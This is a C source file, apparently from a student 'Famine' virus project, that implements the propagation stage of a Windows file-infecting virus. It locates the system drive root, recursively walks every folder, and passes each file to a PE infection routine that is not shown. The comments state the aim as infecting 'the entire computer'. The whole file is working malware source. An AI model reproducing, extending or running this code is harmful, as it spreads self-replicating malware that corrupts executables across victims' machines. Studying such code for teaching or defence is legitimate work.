/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   recursive.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: frmarinh <frmarinh@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/08/08 22:48:26 by frmarinh          #+#    #+#             */
/*   Updated: 2017/08/08 22:48:28 by frmarinh         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "all.h"

/*
**	Get path for starting the infection
*/
static bool				get_start_path(t_famine *famine)
{
	char	*buffer	= NULL;
	int		i		= 0;
	int		res		= 0;

	if (!(buffer = ft_strnew(MAX_WINDOWS_PATH)))
		return (false);
	if ((res = GetWindowsDirectory(buffer, MAX_WINDOWS_PATH - 1)) <= 0)
	{
		print_message(famine, "Someting went wrong while trying to get windows directory", false);
		return (false);
	}
	if (!(famine->recursive_path = ft_strnew(MAX_RECURSIVE_PATH)))
		return (false);
	while (buffer[i] && (buffer[i] != '\\' && buffer[i] != '\\'))
	{
		famine->recursive_path[i] = buffer[i];
		i++;
	}
	famine->recursive_path[i] = buffer[i];
	ft_strdel(&buffer);
	return (true);
}

/*
**	Return true if the path is a directory
*/
static bool				is_directory(const char *path)
{
	struct stat statbuf;
	if (stat(path, &statbuf) != 0)
       return (false);
	return (S_ISDIR(statbuf.st_mode));
}

/*
**	Return file full path
*/
static char				*get_file_path(char *path, char *file_name, bool backslash)
{
	char		*file_path = NULL;

	if (!(file_path = ft_strnew(MAX_RECURSIVE_PATH)))
		return (NULL);
	ft_strcat(file_path, path);
	if (backslash) {
		ft_strcat(file_path, "\\");
	}
	ft_strcat(file_path, file_name);
	return (file_path);
}

/*
**	Infecting recursively all folders on the main disk
*/
static void				infect_me(char *path, t_famine *famine)
{
	DIR				*directory		= NULL;
	struct dirent	*file			= NULL;

	if (!(directory = opendir(path))) {
		print_message(famine, strerror(errno), false);
		return;
	}
		while ((file = readdir(directory)) != NULL) {
			if (ft_strcmp(file->d_name, ".") && ft_strcmp(file->d_name, ".."))
			{
				char	*current = get_file_path(path, file->d_name, (ft_strcmp(path, famine->recursive_path)) ? true : false);
				if (current != NULL) {
					if (is_directory(current)) {
						infect_me(current, famine);
					}
					else {
						pe(famine, current, file->d_name, true);
					}
					ft_strdel(&current);
				}
			}
		}
}

/*
**	Infect the entire computer
*/
void					infect_recursively(t_famine *famine)
{
	get_start_path(famine);
	if (famine->recursive_path != NULL)
		infect_me(famine->recursive_path, famine);
	else {
		print_message(famine, "Can't find windows os directory", false);
	}
}
